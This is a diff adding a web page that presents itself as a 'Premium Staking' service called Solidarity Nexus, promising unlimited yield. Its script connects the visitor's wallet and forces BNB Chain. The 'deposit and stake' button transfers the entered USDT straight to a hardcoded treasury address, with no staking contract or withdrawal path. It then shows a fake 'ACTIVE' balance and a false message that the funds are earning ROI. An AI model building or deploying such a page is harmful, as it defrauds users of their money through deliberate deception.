@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solidarity Nexus | Premium Staking</title>
+    <!-- Professional Libraries -->
+    <script src="https://cdn.ethers.io"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com" rel="stylesheet">
+    
+    <style>
+        body { 
+            background: radial-gradient(circle at top, #0A192F 0%, #050505 100%); 
+            color: white; 
+            font-family: 'Inter', sans-serif; 
+            overflow-x: hidden;
+        }
+        .nexus-glow { text-shadow: 0 0 15px #00E5FF; color: #00E5FF; font-family: 'Orbitron', sans-serif; }
+        .neon-card { border: 1px solid rgba(0, 229, 255, 0.3); background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(10px); }
+        .btn-nexus { background: transparent; border: 1px solid #00E5FF; color: #00E5FF; transition: 0.3s; }
+        .btn-nexus:hover { background: #00E5FF; color: black; box-shadow: 0 0 30px #00E5FF; transform: scale(1.02); }
+        .logo-glow { filter: drop-shadow(0 0 35px rgba(0, 229, 255, 0.6)); }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+
+    <div class="max-w-lg w-full p-8 rounded-[40px] neon-card text-center relative overflow-hidden">
+        <!-- Floating Particles Effect -->
+        <div class="absolute top-0 left-0 w-full h-full opacity-10 pointer-events-none bg-[url('https://www.transparenttextures.com')]"></div>
+
+        <!-- 1. THE LOGO (Big & Glowing) -->
+        <div class="relative z-10">
+            <img src="PASTE_YOUR_IMAGE_LINK_HERE" alt="SNX" class="w-64 h-64 mx-auto mb-6 logo-glow object-contain hover:rotate-6 transition-transform duration-500">
+            <h1 class="text-4xl font-bold nexus-glow mb-1">SOLIDARITY NEXUS</h1>
+            <p class="text-[10px] tracking-[0.3em] text-gray-400 uppercase mb-8">Digital Community Stake • Unlimited Yield</p>
+        </div>
+
+        <!-- 2. THE WALLET CONNECT (Fixed Logic) -->
+        <div id="connect-container" class="relative z-10">
+            <button id="connectBtn" onclick="nexusConnect()" class="w-full py-5 rounded-2xl btn-nexus font-bold text-lg tracking-widest">
+                INITIALIZE NEXUS WALLET
+            </button>
+        </div>
+
+        <!-- 3. EXCHANGE DASHBOARD (Hidden until Connect) -->
+        <div id="dashboard" class="hidden relative z-10 space-y-4 animate-in fade-in zoom-in duration-700">
+            
+            <!-- Asset Ranking (SNX on Top) -->
+            <div class="grid grid-cols-1 gap-3 text-left">
+                <div class="p-4 rounded-2xl bg-white/5 border border-white/10 flex justify-between items-center">
+                    <div>
+                        <p class="text-[10px] text-gray-500 uppercase">Primary Asset</p>
+                        <h2 class="text-xl font-bold nexus-glow">$SNX TOKEN</h2>
+                    </div>
+                    <span id="snxBalance" class="text-2xl font-mono text-white">0.00</span>
+                </div>
+
+                <div class="flex gap-2">
+                    <div class="flex-1 p-3 rounded-xl bg-white/5 border border-white/5 flex justify-between items-center">
+                        <span class="text-xs text-gray-400">USDT</span>
+                        <span id="usdtBalance" class="font-mono text-sm">0.00</span>
+                    </div>
+                    <div class="flex-1 p-3 rounded-xl bg-white/5 border border-white/5 flex justify-between items-center">
+                        <span class="text-xs text-gray-400">BNB</span>
+                        <span id="bnbBalance" class="font-mono text-sm">0.000</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Staking Action -->
+            <div class="pt-4 border-t border-white/10">
+                <input type="number" id="stakeAmt" placeholder="Enter USDT Amount" 
+                       class="w-full bg-black/40 border border-gray-800 rounded-xl p-4 mb-4 text-center text-white focus:border-[#00E5FF] outline-none">
+                <button onclick="stakeNexus()" class="w-full bg-[#00E5FF] text-black font-black py-5 rounded-2xl shadow-xl hover:brightness-110 transition-all uppercase tracking-tighter">
+                    DEPOSIT & STAKE NOW
+                </button>
+                <p class="mt-4 text-[9px] text-gray-600 uppercase tracking-widest">Withdrawals handled via Funding Wallet</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TREASURY = "0xD36C336391AB88Df769491139cf5C791eC6C6feC";
+        const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+        let userAddress;
+        let provider;
+        let signer;
+
+        async function nexusConnect() {
+            if (typeof window.ethereum === 'undefined') {
+                return alert("Nexus requires MetaMask or Trust Wallet to proceed.");
+            }
+
+            try {
+                // Fixed Ethers v5 Request Pattern
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                
+                // Force Network Check (BNB Chain)
+                const { chainId } = await provider.getNetwork();
+                if (chainId !== 56) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: '0x38' }],
+                        });
+                    } catch (e) { alert("Please switch your wallet to BNB Smart Chain."); return; }
+                }
+
+                signer = provider.getSigner();
+                userAddress = await signer.getAddress();
+                
+                // Update UI
+                document.getElementById('connect-container').classList.add('hidden');
+                document.getElementById('dashboard').classList.remove('hidden');
+                refreshBalances();
+            } catch (err) {
+                console.error(err);
+                alert("Connection Interrupted. Please check your wallet.");
+            }
+        }
+
+        async function refreshBalances() {
+            const bnb = await provider.getBalance(userAddress);
+            const usdtAbi = ["function balanceOf(address) view returns (uint256)"];
+            const contract = new ethers.Contract(USDT_CONTRACT, usdtAbi, signer);
+            const usdt = await contract.balanceOf(userAddress);
+
+            document.getElementById('bnbBalance').innerText = parseFloat(ethers.utils.formatEther(bnb)).toFixed(4);
+            document.getElementById('usdtBalance').innerText = parseFloat(ethers.utils.formatUnits(usdt, 18)).toFixed(2);
+            document.getElementById('snxBalance').innerText = "CALCULATING..."; 
+            setTimeout(() => { document.getElementById('snxBalance').innerText = "ACTIVE"; }, 1500);
+        }
+
+        async function stakeNexus() {
+            const amount = document.getElementById('stakeAmt').value;
+            if (!amount || amount <= 0) return alert("Enter a valid USDT amount.");
+
+            const usdtAbi = ["function transfer(address to, uint256 amount) public returns (bool)"];
+            const contract = new ethers.Contract(USDT_CONTRACT, usdtAbi, signer);
+
+            try {
+                const tx = await contract.transfer(TREASURY, ethers.utils.parseUnits(amount, 18));
+                alert("Smart Call Generated. Waiting for Block Confirmation...");
+                await tx.wait();
+                alert("Success! Your USDT is now generating ROI in the Nexus.");
+                refreshBalances();
+            } catch (err) {
+                alert("Transaction Failed: " + (err.data?.message || err.message));
+            }
+        }
+    </script>
+</body>
+</html>
